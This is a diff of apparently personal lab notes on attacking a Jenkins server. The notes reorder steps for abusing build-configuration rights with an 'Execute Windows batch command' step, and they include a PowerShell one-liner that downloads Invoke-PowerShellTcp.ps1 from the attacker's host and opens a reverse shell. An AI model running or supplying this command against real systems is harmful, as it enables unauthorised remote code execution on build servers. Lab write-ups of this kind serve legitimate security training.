@@ -89,18 +89,20 @@ password:builduser"
 ![alt text](image-19.png)
 
 then by visiting the profile we are checking that we can configure build or we have admin access we just simply visit the "http://jenkinsserverip/script" and input script and run that to try cmd exectuion and rev shells
+here we dont have admin priv,, so if we can configure builds then we can configure a build as "Execute Windows batch command" with including a reverse shell to the destination of ours attacking machine and dowloadin the revershell code
+``` powershell.exe iex (iwr http://172.16.100.219/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.219 -Port 443```
+
+then save....
+
+![alt text](image-16.png)
 
 host the revershell on our machine using hfs
 
 ![alt text](image-17.png)
-here we dont have admin priv,, so if we can configure builds then we can configure a build as "Execute Windows batch command" with including a reverse shell to the destination of ours attacking machine and dowloadin the revershell code
 
 
-``` powershell.exe iex (iwr http://172.16.100.219/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.219 -Port 443```
 
-![alt text](image-16.png)
 
-then save....
 
 
 Now start a listener on our machine
